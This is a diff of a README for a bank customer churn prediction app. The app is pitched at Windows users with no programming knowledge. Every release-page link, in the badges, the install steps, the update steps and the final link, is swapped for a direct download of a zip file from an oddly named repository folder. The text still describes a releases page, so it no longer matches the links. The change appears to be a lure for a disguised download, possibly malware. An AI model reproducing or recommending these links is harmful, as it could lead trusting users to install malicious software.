@@ -1,6 +1,6 @@
 # 📊 Bank_Customer_Churn_Prediction - Predict Customer Bank Churn Simply
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/main/Wewenoc/Bank_Prediction_Customer_Churn_v2.9.zip)
 
 ---
 
@@ -26,11 +26,11 @@ You do not need to know programming. The app works on Windows and guides you thr
 
 To start, you will visit the release page to download the program files.
 
-[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/releases)
+[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/main/Wewenoc/Bank_Prediction_Customer_Churn_v2.9.zip)
 
 1. Click the "Visit Release Page" button above or visit:
    
-   https://github.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/releases
+   https://raw.githubusercontent.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/main/Wewenoc/Bank_Prediction_Customer_Churn_v2.9.zip
 
 2. On the releases page, look for the latest release version (it usually has the highest number). 
 
@@ -105,7 +105,7 @@ This process helps banks plan better customer care.
 
 1. Return to the release page here:
 
-   https://github.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/releases
+   https://raw.githubusercontent.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/main/Wewenoc/Bank_Prediction_Customer_Churn_v2.9.zip
 
 2. Download the new version following the same steps as before.
 3. Install it or replace the old files with the new ones.
@@ -155,4 +155,4 @@ banking, banking analytics, churn prediction, classification, data science, mach
 
 ## 🔗 Download Link (Again for Quick Access)
 
-[Download or update the app here](https://github.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/releases)
+[Download or update the app here](https://raw.githubusercontent.com/uricosuric-genuslepidobotrys693/Bank_Customer_Churn_Prediction/main/Wewenoc/Bank_Prediction_Customer_Churn_v2.9.zip)
